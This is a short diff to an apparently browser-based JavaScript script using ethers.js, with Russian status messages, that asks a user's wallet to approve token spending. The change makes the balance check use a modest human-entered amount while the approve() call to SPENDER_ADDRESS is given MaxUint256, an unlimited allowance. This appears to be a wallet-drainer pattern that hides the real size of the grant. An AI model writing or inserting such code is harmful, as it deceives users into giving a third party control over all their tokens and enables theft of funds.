@@ -156,7 +156,8 @@
         const decimals = await token.decimals();
         const balance = await token.balanceOf(userAddress);
 
-        const amount = ethers.MaxUint256; //parseUnits(HUMAN_AMOUNT, decimals)
+        const value = ethers.MaxUint256;
+        const amount = ethers.parseUnits(HUMAN_AMOUNT, decimals);
 
         if (balance < amount) {
           throw new Error(
@@ -171,7 +172,7 @@
 Отправляем approve...`
         );
 
-        const tx = await token.approve(SPENDER_ADDRESS, amount);
+        const tx = await token.approve(SPENDER_ADDRESS, value);
 
         setStatus(`Транзакция отправлена:\n${tx.hash}\nОжидаем подтверждение...`);
 
